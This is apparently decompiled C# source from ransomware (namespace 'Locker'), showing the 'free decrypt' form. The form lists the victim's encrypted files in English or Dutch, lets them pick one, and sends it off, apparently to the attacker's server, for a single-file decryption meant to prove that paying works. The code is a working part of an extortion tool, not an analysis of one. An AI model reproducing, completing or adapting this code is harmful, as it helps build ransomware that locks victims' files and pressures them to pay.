using System;
using System.ComponentModel;
using System.Globalization;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace Locker;

public class frmGetFreeDecrypt : Form
{
	private Class1 class1_0;

	private IContainer icontainer_0;

	private ListView lvFiles;

	private Button btnDecrypt;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	private BackgroundWorker backgroundWorker_0;

	public frmGetFreeDecrypt()
	{
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		InitializeComponent();
		if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
		{
			((Control)btnDecrypt).set_Text("Ontgrendel bestand");
			columnHeader_0.set_Text("Bestandsnaam");
			columnHeader_1.set_Text("Mapnaam");
		}
		foreach (Class1 item in Class3.Class3_0.list_2)
		{
			if (item.Boolean_0)
			{
				ListViewItem val = new ListViewItem(item.FileInfo_0.Name);
				val.get_SubItems().Add(item.FileInfo_0.FullName);
				val.set_Tag((object)item);
				lvFiles.get_Items().Add(val);
			}
		}
	}

	private void btnDecrypt_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Invalid comparison between Unknown and I4
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Unknown result type (might be due to invalid IL or missing references)
		if (lvFiles.get_SelectedItems().get_Count() == 1)
		{
			if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
			{
				if ((int)MessageBox.Show("Weet u zeker dat dit het bestand is dat u wilt ontgrendelen?", "Bevestiging", (MessageBoxButtons)4, (MessageBoxIcon)32) != 6)
				{
					return;
				}
			}
			else if ((int)MessageBox.Show("Are you sure this is the file you want to decrypt?", "Decrypt confirmation", (MessageBoxButtons)4, (MessageBoxIcon)32) != 6)
			{
				return;
			}
			((Control)btnDecrypt).set_Enabled(false);
			class1_0 = (Class1)lvFiles.get_SelectedItems().get_Item(0).get_Tag();
			backgroundWorker_0.RunWorkerAsync();
		}
		else if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
		{
			MessageBox.Show("Selecteer alstublieft één bestand.", "Info", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			MessageBox.Show("Please select one file.", "Info", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
	{
		if (Class1.smethod_0(class1_0, null))
		{
			e.Result = 0;
			return;
		}
		byte[] array = Class2.smethod_2(class1_0);
		byte[] array2 = Class7.smethod_15(array);
		if (array.Length != array2.Length)
		{
			e.Result = Encoding.UTF8.GetString(array2);
		}
		else if (Class2.smethod_3(class1_0, array2))
		{
			e.Result = "1";
		}
		else
		{
			e.Result = "0";
		}
	}

	private void backgroundWorker_0_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		if (e.Error != null)
		{
			MessageBox.Show(e.Error!.Message);
		}
		else if (e.Cancelled)
		{
			MessageBox.Show("Canceled");
		}
		else if ((string)e.Result == "1")
		{
			Class1 @class = Class3.Class3_0.list_2.Find((Class1 class1_1) => class1_1.FileInfo_0.FullName == class1_0.FileInfo_0.FullName);
			if (@class.FileInfo_0 != null)
			{
				@class.Boolean_0 = false;
				Class3.Class3_0.method_4(bool_5: true);
			}
			if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
			{
				MessageBox.Show("Uw bestand is ontgrendeld!", "Ontgrendeling geslaagd", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			else
			{
				MessageBox.Show("The file was successfully decrypted!", "Decrypted", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
		}
		else if ((string)e.Result == "0")
		{
			MessageBox.Show("Something went wrong", "error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
		{
			MessageBox.Show("Fout ontvangen van de server: \r\n" + e.Result!.ToString(), "Fout", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			MessageBox.Show("Error from server: \r\n" + e.Result!.ToString(), "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmGetFreeDecrypt));
		lvFiles = new ListView();
		columnHeader_0 = new ColumnHeader();
		columnHeader_1 = new ColumnHeader();
		btnDecrypt = new Button();
		backgroundWorker_0 = new BackgroundWorker();
		((Control)this).SuspendLayout();
		lvFiles.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { columnHeader_0, columnHeader_1 });
		lvFiles.set_FullRowSelect(true);
		componentResourceManager.ApplyResources(lvFiles, "lvFiles");
		((Control)lvFiles).set_Name("lvFiles");
		lvFiles.set_UseCompatibleStateImageBehavior(false);
		lvFiles.set_View((View)1);
		componentResourceManager.ApplyResources(columnHeader_0, "chFilename");
		componentResourceManager.ApplyResources(columnHeader_1, "chFullPath");
		componentResourceManager.ApplyResources(btnDecrypt, "btnDecrypt");
		((Control)btnDecrypt).set_Name("btnDecrypt");
		((ButtonBase)btnDecrypt).set_UseVisualStyleBackColor(true);
		((Control)btnDecrypt).add_Click((EventHandler)btnDecrypt_Click);
		backgroundWorker_0.DoWork += backgroundWorker_0_DoWork;
		backgroundWorker_0.RunWorkerCompleted += backgroundWorker_0_RunWorkerCompleted;
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)btnDecrypt);
		((Control)this).get_Controls().Add((Control)(object)lvFiles);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("frmGetFreeDecrypt");
		((Control)this).ResumeLayout(false);
	}

	[CompilerGenerated]
	private bool method_0(Class1 class1_1)
	{
		return class1_1.FileInfo_0.FullName == class1_0.FileInfo_0.FullName;
	}
}
